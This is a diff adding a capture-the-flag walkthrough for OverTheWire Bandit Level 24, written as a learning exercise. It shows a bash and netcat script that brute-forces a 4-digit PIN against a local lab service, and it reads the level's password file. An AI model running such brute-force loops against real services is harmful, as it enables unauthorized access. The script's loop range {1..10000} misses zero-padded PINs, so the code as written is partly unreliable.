@@ -1,0 +1,47 @@
+Bandit Level 24
+
+Goal:
+A service running on port 30002 will give the password for the next level if provided with the correct bandit24 password and a 4-digit secret pincode. The pincode must be brute-forced.
+
+Steps:
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+nc localhost 30002
+
+
+Check the current level password:
+
+cat /etc/bandit_pass/bandit24
+
+
+Create a temporary working directory:
+
+mktemp -d
+cd /tmp/tmp.XXXXXXXXXX
+
+
+Create a brute-force script:
+
+cat > brute.sh << 'EOF'
+#!/bin/bash
+p="<bandit24_password>"
+for i in {1..10000}
+do
+  echo "$p $i"
+done | nc localhost 30002
+EOF
+
+
+Make it executable and run it:
+
+chmod +x brute.sh
+./brute.sh
+
+
+The script sends all pincode combinations through a single connection until the correct one is found.
+
+Result:
+The correct pincode was found and the password for Bandit Level 25 was obtained.
+
+Learning:
+Learned how to perform a brute-force attack using bash scripting, loops, and netcat while maintaining a single network connection.
